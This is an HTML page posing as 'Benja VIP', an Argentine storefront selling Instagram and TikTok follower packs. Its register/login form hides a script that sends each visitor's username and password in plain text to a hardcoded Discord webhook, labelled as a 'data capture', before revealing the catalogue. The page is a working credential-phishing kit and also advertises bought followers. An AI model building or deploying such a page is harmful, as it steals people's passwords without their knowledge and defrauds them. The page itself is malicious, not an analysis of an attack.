<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Benja VIP | Elite Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --gold: #d4af37; --bg: #050505; --card: #111; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 400px; padding: 20px; box-sizing: border-box; }
        
        /* PANTALLA DE REGISTRO */
        #auth-screen { text-align: center; margin-top: 40px; }
        .auth-card { background: var(--card); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); }
        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #333; color: white; border-radius: 12px; box-sizing: border-box; outline: none; }
        .btn-gold { width: 100%; padding: 16px; background: var(--gold); border: none; border-radius: 12px; font-weight: 900; cursor: pointer; color: black; text-transform: uppercase; }

        /* PANEL DE PRODUCTOS COMPACTO */
        #main-panel { display: none; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; }
        .card { background: var(--card); padding: 15px; border-radius: 20px; border: 1px solid #1a1a1a; position: relative; text-align: center; }
        
        /* CARTEL MÁS VENDIDO */
        .badge { position: absolute; top: -8px; right: -5px; background: #E1306C; color: white; font-size: 8px; padding: 4px 10px; border-radius: 6px; font-weight: 900; box-shadow: 0 4px 10px rgba(225,48,108,0.3); }
        
        .price { color: var(--gold); font-size: 14px; font-weight: bold; margin: 8px 0; display: block; }
        .btn-buy { background: #25D366; color: white; text-decoration: none; padding: 10px; border-radius: 10px; font-size: 11px; font-weight: 800; display: block; }
    </style>
</head>
<body>

<div class="container">
    <div id="auth-screen">
        <div class="auth-card">
            <h1 style="color:var(--gold); margin: 0;">BENJA VIP</h1>
            <p style="font-size: 9px; color: #555; letter-spacing: 3px;">SISTEMA DE ACCESO GLOBAL</p>
            <input type="text" id="user" placeholder="Nombre de Usuario">
            <input type="password" id="pass" placeholder="Contraseña de Acceso">
            <button class="btn-gold" onclick="enviarYEntrar()">REGISTRARSE / ENTRAR</button>
        </div>
    </div>

    <div id="main-panel">
        <h3 style="text-align: center; letter-spacing: 2px;">CATÁLOGO SOCIOS</h3>
        <div class="grid">
            <div class="card">
                <div class="badge">MÁS VENDIDO 🔥</div>
                <i class="fab fa-instagram" style="color:#E1306C; font-size: 20px;"></i>
                <b style="display:block; margin-top: 5px; font-size: 14px;">20k SEGUIDORES</b>
                <span class="price">$30.000 AR$</span>
                <a href="https://wa.me/5493364546172?text=Deseo%20el%20Pack%2020k" class="btn-buy">COMPRAR</a>
            </div>

            <div class="card" style="border-color: var(--gold)">
                <div class="badge" style="background:var(--gold); color:black">ELITE 💎</div>
                <i class="fab fa-instagram" style="color:var(--gold); font-size: 20px;"></i>
                <b style="display:block; margin-top: 5px; font-size: 14px;">100k SEGUIDORES</b>
                <span class="price">$80.000 AR$</span>
                <a href="https://wa.me/5493364546172?text=Deseo%20el%20Pack%20100k" class="btn-buy" style="background:var(--gold); color:black">COMPRAR</a>
            </div>

            <div class="card">
                <i class="fab fa-tiktok" style="color:#00f2ea; font-size: 20px;"></i>
                <b style="display:block; margin-top: 5px; font-size: 14px;">20k SEGUIDORES</b>
                <span class="price">$35.000 AR$</span>
                <a href="https://wa.me/5493364546172?text=Deseo%20el%20Pack%20TikTok" class="btn-buy">COMPRAR</a>
            </div>

            <div class="card">
                <i class="fab fa-whatsapp" style="color:#25D366; font-size: 20px;"></i>
                <b style="display:block; margin-top: 5px; font-size: 14px;">COMBO 170k</b>
                <span class="price">$65.000 AR$</span>
                <a href="https://wa.me/5493364546172?text=Deseo%20el%20Combo%20WA" class="btn-buy">COMPRAR</a>
            </div>
        </div>
    </div>
</div>

<script>
    async function enviarYEntrar() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        
        if(!u || !p) return alert("Completa los datos.");

        // URL de tu Webhook ya vinculada
        const webhookURL = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ"; 

        const data = {
            content: `🚀 **NUEVA CAPTURA DE DATOS**\n👤 **Usuario:** \`${u}\` \n🔑 **Clave:** \`${p}\` \n🌍 **Plataforma:** Benja VIP`
        };

        // Enviamos a Discord
        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        } catch(e) {}

        // Pasamos al panel de productos
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('main-panel').style.display = 'block';
    }
</script>

</body>
</html>
